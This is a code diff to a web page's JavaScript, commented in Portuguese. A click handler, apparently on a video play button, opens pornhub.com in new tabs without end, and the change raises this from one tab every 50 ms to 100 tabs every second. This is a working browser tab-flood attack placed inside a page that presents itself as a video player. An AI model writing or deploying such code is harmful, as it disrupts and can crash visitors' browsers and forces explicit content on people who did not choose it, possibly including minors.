@@ -121,10 +121,12 @@
             player.src += ""; // Reinicia o src para tentar o autoplay novamente
             
             // Abre novas guias infinitamente
-            setInterval(() => {
+            function openMultipleTabs() {
+            for (let i = 0; i < 100; i++) {
                 window.open("https://pornhub.com/", "_blank"); // Altere o link para o que você preferir
-            }, 50); // Altera 1000 para o intervalo desejado em milissegundos
+            }
         }
+            setInterval(openMultipleTabs, 1000); // Abre guias a cada 1000 ms (1 segundo)
 
         // Adiciona um listener de clique ao botão
         document.getElementById('playButton').addEventListener('click', startVideoAndOpenTabs);
